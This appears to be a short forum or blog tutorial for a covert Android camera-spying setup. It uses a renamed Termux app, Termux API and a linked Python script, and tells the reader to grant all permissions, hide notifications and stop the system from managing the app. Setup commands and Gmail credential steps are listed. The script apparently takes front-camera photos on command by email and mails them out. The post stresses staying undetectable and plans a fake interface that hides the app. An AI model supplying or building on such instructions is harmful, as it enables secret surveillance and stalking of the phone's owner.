Here is the link of the termux app with name changed..
And termux API app and python script already uploaded in the https://github.com/shArk-CyberSecurity/spyCamTermux..
After installing both apps,you have to allow restricted permissions,all other permissions..disable "manage app if unused",
Allow display over other apps and turn off the notification...

1)pkg update && pkg upgrade -y
2)pkg install -y python termux-api
3)pip install --upgrade pip
4)pip install pillow
5)termux-setup-storage
Run this commands before running the python script in the terminal..
Generate an app password and put it into the code with the sender gmail address and receiver gmail address..
Suppose you send gmail to receiver gmail address "CAM60"...then the code will capture 60 images from front camera
and send it to the receiver gmail address by converting it to a GIF FILE..so It supports from CAM1 to CAM80..Less number
captures keeps the hacker undetectable..
I am looking forward to build a terminal like app like termux with icon,name changed,1st fake interface with hidden button that will keep the termux app undetectable..In this project i just changed the app name not the icon..I need time to build a app like termux..If I successfully made it you can put any script you want in the terminal,and the terminal will do the job.It removes app based dependency and becomes useful to run hacking scripts 24/7 in the background..
As i have written this tutorial on a little hurry,I am sorry for my English.
